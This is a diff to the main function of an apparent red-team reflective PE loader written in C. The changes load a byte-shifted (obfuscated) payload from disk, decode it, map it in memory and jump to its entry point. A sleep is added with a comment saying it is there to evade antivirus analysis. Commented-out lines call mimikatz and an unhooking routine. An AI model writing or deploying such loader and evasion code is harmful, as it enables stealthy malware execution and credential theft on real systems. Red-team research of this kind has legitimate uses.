@@ -206,28 +206,32 @@ unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
 
 // exemple: mimikatz
 int main(int argc, char *argv[]) {
+	printf("Start 10s\n");
+	Sleep(10000);//if AV kill it at this stage, it perform static analysis on runtime
 
 		//create_box();
 		size_t len;
 		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
 		
-		unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
+		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
 		
 		
-		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\seb.txt", &len);
-		//for (size_t i = 0; i < len; ++i) {
-		//	raw[i] = raw[i] - 1;
-		//}
-		// 
-		// 
+		unsigned char* raw = get_file("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt", &len);
+
+		for (size_t i = 0; i < len; ++i) {
+			raw[i] = raw[i] - 1;
+		}
+		 
+		 
 		
-		
+
 		PVOID EP = UnpackAndRunEp(raw, len, TRUE);
-		main_unhook(0,NULL);
-		//((VOID(*)())EP)();
-		main_mimikatz(0, NULL);
+		//main_unhook(0,NULL);
+#if 1
+		((VOID(*)())EP)();
+		//main_mimikatz(0, NULL);
 
-
+#endif
 		printf("Press any key to continue");
 		getchar();
 	
